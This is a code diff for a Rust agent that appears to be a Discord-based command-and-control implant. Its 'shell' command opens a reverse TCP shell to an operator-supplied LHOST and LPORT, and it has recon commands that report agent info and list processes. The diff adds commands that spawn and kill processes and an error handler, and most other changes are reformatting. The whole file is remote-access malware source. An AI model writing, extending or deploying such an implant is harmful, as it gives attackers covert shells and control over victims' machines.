@@ -1,9 +1,12 @@
 use std::{net::IpAddr, process::Stdio, sync::Arc};
 
-use commands::{recon, utils};
+use commands::{process, recon, utils};
 use config::AgentConfig;
 use constants::RUSCORD_GUILD_ID;
-use poise::serenity_prelude::{self as serenity, futures::StreamExt};
+use poise::{
+	serenity_prelude::{self as serenity, futures::StreamExt},
+	FrameworkError,
+};
 use tokio::{
 	io::{AsyncReadExt, AsyncWriteExt},
 	net::TcpStream,
@@ -26,10 +29,11 @@ pub mod constants {
 	include!(concat!(env!("OUT_DIR"), "/constants.rs"));
 }
 
+#[derive(Debug)]
 pub struct Data {
-	pub config:              Mutex<AgentConfig>,
+	pub config: Mutex<AgentConfig>,
 	pub initialization_time: tokio::time::Instant,
-	pub os_module:           crate::os::OsModule,
+	pub os_module: crate::os::OsModule,
 }
 
 pub type RuscordError = Box<dyn std::error::Error + Send + Sync>;
@@ -38,8 +42,7 @@ pub type RuscordContext<'a> = poise::Context<'a, Data, RuscordError>;
 /// Initializes a reverse TCP shell to the given LHOST and LPORT.
 #[poise::command(prefix_command)]
 async fn shell(
-	ctx: RuscordContext<'_>,
-	#[description = "LHOST"] listening_ip: IpAddr,
+	ctx: RuscordContext<'_>, #[description = "LHOST"] listening_ip: IpAddr,
 	#[description = "LPORT"] listening_port: u16,
 ) -> Result<(), RuscordError> {
 	match TcpStream::connect((listening_ip, listening_port)).await {
@@ -114,7 +117,9 @@ async fn shell(
 #[tokio::main]
 async fn main() {
 	std::env::set_var("RUST_LOG", "warn,discord_c2=debug");
-	tracing_subscriber::fmt().with_env_filter(EnvFilter::from_default_env()).init();
+	tracing_subscriber::fmt()
+		.with_env_filter(EnvFilter::from_default_env())
+		.init();
 	let token = std::env::var("DISCORD_TOKEN").expect("missing DISCORD_TOKEN");
 	let intents = serenity::GatewayIntents::all();
 
@@ -124,8 +129,25 @@ async fn main() {
 				prefix: Some("!".into()),
 				..Default::default()
 			},
-			commands: vec![utils::clear(), utils::help(), recon::agent_info(), recon::processes()],
+			commands: vec![
+				utils::clear(),
+				utils::help(),
+				recon::agent_info(),
+				recon::processes(),
+				process::spawn(),
+				process::kill(),
+			],
 			event_handler: |ctx, event, framework, data| Box::pin(event_handler(ctx, event, framework, data)),
+			on_error: |error| {
+				Box::pin(async move {
+					match error {
+						FrameworkError::Command { error, ctx, .. } => {
+							reply!(ctx, "{error}");
+						},
+						other => poise::builtins::on_error(other).await.unwrap(),
+					}
+				})
+			},
 			command_check: Some(|ctx| {
 				Box::pin(async move {
 					if ctx.channel_id() != ctx.data().config.lock().await.command_channel {
@@ -141,22 +163,23 @@ async fn main() {
 				let agent_config = AgentConfig::load_config(ctx).await?;
 				poise::builtins::register_in_guild(ctx, &framework.options().commands, RUSCORD_GUILD_ID).await?;
 				Ok(Data {
-					config:              Mutex::new(agent_config),
+					config: Mutex::new(agent_config),
 					initialization_time: tokio::time::Instant::now(),
-					os_module:           crate::os::OsModule::default(),
+					os_module: crate::os::OsModule::default(),
 				})
 			})
 		})
 		.build();
 
-	let mut client = serenity::ClientBuilder::new(token, intents).framework(framework).await.unwrap();
+	let mut client = serenity::ClientBuilder::new(token, intents)
+		.framework(framework)
+		.await
+		.unwrap();
 	client.start().await.unwrap();
 }
 
 async fn event_handler(
-	ctx: &serenity::Context,
-	event: &serenity::FullEvent,
-	_framework: poise::FrameworkContext<'_, Data, RuscordError>,
+	ctx: &serenity::Context, event: &serenity::FullEvent, _framework: poise::FrameworkContext<'_, Data, RuscordError>,
 	data: &Data,
 ) -> Result<(), RuscordError> {
 	match event {
